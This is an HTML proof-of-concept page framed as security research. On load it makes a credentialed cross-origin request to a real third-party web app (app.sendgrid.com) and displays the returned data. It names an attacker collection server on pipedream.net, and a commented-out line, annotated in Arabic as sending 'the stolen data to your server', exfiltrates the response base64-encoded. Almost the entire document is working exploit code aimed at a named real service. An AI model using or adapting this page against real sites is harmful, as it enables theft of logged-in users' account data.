<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: CORS & DOM-XSS Data Exfiltration</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6; }
        .card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-left: 5px solid #e74c3c; }
        h1 { color: #e74c3c; margin-top: 0; }
        code { background: #eee; padding: 2px 5px; border-radius: 4px; color: #c7254e; }
        .status { margin-top: 20px; padding: 15px; border-radius: 6px; background: #e8f4fd; border: 1px solid #d1e9fb; }
    </style>
</head>
<body>

<div class="card">
    <h1>Security Research: CORS/XSS PoC</h1>
    <p><strong>Target URL:</strong> <code id="target-display">https://app.sendgrid.com/guide</code></p>
    <p><strong>Attacker Origin:</strong> <code id="attacker-display"></code></p>
    <hr>
    <div id="status-box" class="status">
        [+] Initializing attack sequence...
    </div>
</div>

<script>
    const TARGET_API = "https://app.sendgrid.com/guide"; 
    const ATTACKER_SERVER = "https://eo95zv3v5okp4gx.m.pipedream.net"; 

    document.getElementById('attacker-display').innerText = window.location.origin;
    document.getElementById('target-display').innerText = TARGET_API;
    const statusBox = document.getElementById('status-box');

    function logStatus(msg) {
        statusBox.innerHTML += "<br>[*] " + msg;
        console.log(msg);
    }

    window.onload = function() {
        logStatus("Attempting to fetch data with credentials...");

        fetch(TARGET_API, {
            method: 'GET',
            mode: 'cors',
            credentials: 'include',
            headers: {
                'Accept': 'application/json'
            }
        })
        .then(response => {
            logStatus("Response received. Status: " + response.status);
            if (response.ok || response.status === 200) {
                return response.text();
            } else {
                throw new Error("CORS Policy blocked the access (Status " + response.status + ")");
            }
        })
        .then(data => {
            logStatus("<strong style='color:green;'>SUCCESS! Data extracted.</strong>");
            
            alert("Vulnerability Confirmed!\n\nExtracted Data:\n" + data.substring(0, 500));

            // اختيارياً: إرسال البيانات المسروقة لخادمك
            // fetch(ATTACKER_SERVER + "?data=" + btoa(data));
        })
        .catch(error => {
            logStatus("<strong style='color:red;'>FAILED:</strong> " + error.message);
            console.error(error);
        });
    };

</script>
</body>
</html>
